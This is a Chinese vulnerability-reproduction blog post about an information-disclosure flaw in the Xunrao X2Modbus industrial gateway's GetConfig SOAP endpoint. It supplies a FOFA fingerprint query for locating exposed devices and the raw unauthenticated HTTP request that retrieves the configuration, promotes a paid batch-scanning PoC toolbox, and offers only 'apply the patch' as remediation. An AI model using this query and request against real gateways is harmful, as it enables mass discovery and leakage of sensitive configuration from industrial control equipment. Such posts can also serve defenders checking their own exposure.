#  迅饶科技X2Modbus网关GetConfig接口存在敏感信息泄露漏洞 附POC  
2026-4-8更新
                    2026-4-8更新  南风漏洞复现文库   2026-04-08 15:40  
  
   
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 迅饶科技X2Modbus网关简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
迅饶科技X2Modbus网关  
## 2.漏洞描述  
  
迅饶科技X2Modbus网关GetConfig接口存在敏感信息泄露漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
迅饶科技X2Modbus网关  
![迅饶科技X2Modbus网关GetConfig接口存在敏感信息泄露漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/b9KQYsB8q6zotm3zRkApeYMQPSslK3KSCMiaG3sbY1pQ1HB6jnCmXfc5UWmGGMKdWwORm7H7n8oVyNSTLlxeLx176ibM5ib8MwfkLk5kwPRv18/640?wx_fmt=png&from=appmsg "null")  
  
迅饶科技X2Modbus网关GetConfig接口存在敏感信息泄露漏洞  
## 4.fofa查询语句  
  
icon_hash="-1384370370"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/soap/GetConfig  
  
漏洞数据包：  
```
GET /soap/GetConfig HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6xaRMEpsxbaak0zWj8EzuXaSlfia0L7HLiaImyYkpybWpvFbtkwWY4yoad9URnwEZQAGmyODLZTQorxA9IsXPwpBtpMlQcpQI19I/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
5: Nuclei脚本。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zJCFlicgEDE4tX2hMzlvl9kXL05E1VribT5oC0Mg76Z5nsic5BDsgn6ZjUxjGj6zV6fvcJRyGicxGc8ITQeibFbLVcpkrpgWAlATvY/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zK3cibpkespiarNYRAjjOLXwZkByoGDJTOOsHdwypocEIy0y4EKJVWOrUhZkX5j9d8A7jWEjiaUJKrm2LN9tDoxKvC1C1UF5ibJ7M/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xVKj2RQCmSSibytySdgHwPMQpeUDL4eUcebmrGd2g2dSdyuc7RfFvPOWmcpibLgmiaHaOGlf4Wibicp7CMTo8OVA4Jh3zXicLmBhUeA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zNTeX84Ruiasn7kg9IdwRd1vJ7OvDVg9yMAZbeWmdCygI2XuTaHz4jDvCQJMcIvd2Ydx5Cpv8w1YlwMZalfAic6SIDdfzIkfRCY/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6z304kocFh9cMtUsATwSic2t8uo6eD63Jkl5T1SDib8WCOYKNwYa9eTV0qP08uMSShPibC03hJy0w9u6tdyMmtjVvRGeHNhQPAplU/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6yH4e9dcEyxa8cuJsIMiaLp6Ju0N1hw2QlP67V4Diaojz9pial2a1UY36nenmFGK9skcTBiaiaadE1IsxDqkprzbyrnIG1ZFaxSpBtQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
[亿赛通-电子文档安全管理系统DecryptApplication;Servicelogin接口存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247490250&idx=1&sn=be0b269b93ab3de46ae23feeb110893d&scene=21#wechat_redirect)  
  
  
